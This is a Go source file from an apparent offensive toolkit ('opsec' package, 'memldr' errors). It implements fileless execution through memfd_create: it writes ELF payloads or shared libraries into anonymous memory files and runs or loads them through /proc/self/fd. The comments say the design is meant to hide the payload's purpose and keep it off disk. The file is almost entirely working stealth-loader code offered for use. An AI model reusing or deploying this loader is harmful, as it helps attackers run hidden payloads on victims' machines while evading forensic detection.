package opsec

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/unix"
)

// MFD_CLOEXEC sets close-on-exec on the memfd file descriptor.
const mfdCloexec = 0x0001

// MemfdCreate creates an anonymous file in memory using the memfd_create
// syscall. It uses an empty name to avoid revealing the purpose in
// /proc/pid/fd/ symlink targets. The fd is created with MFD_CLOEXEC
// so it is automatically closed on exec unless explicitly inherited.
func MemfdCreate(name string) (int, error) {
	// Use empty string for stealth: /proc/pid/fd/N will show "memfd: (deleted)"
	// rather than a descriptive name.
	displayName := name

	nameBytes, err := unix.BytePtrFromString(displayName)
	if err != nil {
		return -1, fmt.Errorf("memldr: invalid name: %w", err)
	}

	fd, _, errno := syscall.RawSyscall(
		319, // SYS_MEMFD_CREATE on amd64
		uintptr(unsafe.Pointer(nameBytes)),
		uintptr(mfdCloexec),
		0,
	)
	if errno != 0 {
		return -1, fmt.Errorf("memldr: memfd_create failed: %w", errno)
	}

	return int(fd), nil
}

// MemfdExec creates a memfd, writes the payload (an ELF binary) into it,
// and executes it via /proc/self/fd/N. This achieves fileless execution
// where the binary never touches disk.
func MemfdExec(payload []byte, argv []string, envv []string) error {
	fd, err := MemfdCreate("")
	if err != nil {
		return err
	}

	// Write the payload to the memfd.
	if _, err := syscall.Write(fd, payload); err != nil {
		syscall.Close(fd)
		return fmt.Errorf("memldr: failed to write payload to memfd: %w", err)
	}

	// Build the /proc/self/fd/N path for fexecve.
	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	// Clear MFD_CLOEXEC so the fd survives exec if needed, though we
	// exec via the fd path so the kernel opens the file fresh.
	// The fd itself can remain cloexec since we reference via path.

	// Use syscall.Exec to replace the current process entirely.
	// If argv is empty, use a default.
	if len(argv) == 0 {
		argv = []string{""}
	}

	// If no env provided, inherit current environment.
	if envv == nil {
		envv = os.Environ()
	}

	// Exec replaces the current process image; it does not return on success.
	if err := syscall.Exec(fdPath, argv, envv); err != nil {
		syscall.Close(fd)
		return fmt.Errorf("memldr: exec from memfd failed: %w", err)
	}

	// Unreachable on success.
	return nil
}

// MemfdExecWithOutput creates a memfd, writes the payload, and executes it
// as a child process, capturing stdout and stderr. Unlike MemfdExec, this
// does not replace the current process.
func MemfdExecWithOutput(payload []byte, argv []string) ([]byte, error) {
	fd, err := MemfdCreate("")
	if err != nil {
		return nil, err
	}
	defer syscall.Close(fd)

	// Write the ELF payload into the memfd.
	if _, err := syscall.Write(fd, payload); err != nil {
		return nil, fmt.Errorf("memldr: failed to write payload to memfd: %w", err)
	}

	// Build the /proc/self/fd/N path.
	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	// Clear close-on-exec so the child process can access the fd path.
	if _, err := unix.FcntlInt(uintptr(fd), unix.F_SETFD, 0); err != nil {
		return nil, fmt.Errorf("memldr: failed to clear cloexec: %w", err)
	}

	if len(argv) == 0 {
		argv = []string{fdPath}
	}

	cmd := exec.Command(fdPath, argv[1:]...)
	cmd.Args = argv

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		// Include stderr in the error context if there is any.
		if stderr.Len() > 0 {
			return stdout.Bytes(), fmt.Errorf("memldr: execution failed: %w: %s", err, stderr.String())
		}
		return stdout.Bytes(), fmt.Errorf("memldr: execution failed: %w", err)
	}

	// Combine stdout and stderr.
	var combined bytes.Buffer
	combined.Write(stdout.Bytes())
	if stderr.Len() > 0 {
		combined.Write(stderr.Bytes())
	}

	return combined.Bytes(), nil
}

// MemfdLoad loads a shared library from memory by writing it to a memfd
// and returning the fd path that can be used with dlopen or cgo.
// The caller is responsible for closing the returned fd when done.
func MemfdLoad(payload []byte) (uintptr, error) {
	fd, err := MemfdCreate("")
	if err != nil {
		return 0, err
	}

	// Write the shared object payload to the memfd.
	if _, err := syscall.Write(fd, payload); err != nil {
		syscall.Close(fd)
		return 0, fmt.Errorf("memldr: failed to write library payload to memfd: %w", err)
	}

	// Seal the memfd to prevent further writes (makes it look more like
	// a regular file mapping and some loaders prefer this).
	_, _, errno := syscall.RawSyscall(
		syscall.SYS_FCNTL,
		uintptr(fd),
		uintptr(unix.F_ADD_SEALS),
		uintptr(unix.F_SEAL_SEAL|unix.F_SEAL_SHRINK|unix.F_SEAL_GROW|unix.F_SEAL_WRITE),
	)
	if errno != 0 {
		// Non-fatal: sealing is best-effort.
		_ = errno
	}

	// Return the fd as a uintptr. The caller can use
	// fmt.Sprintf("/proc/self/fd/%d", fd) to get the path for dlopen.
	return uintptr(fd), nil
}
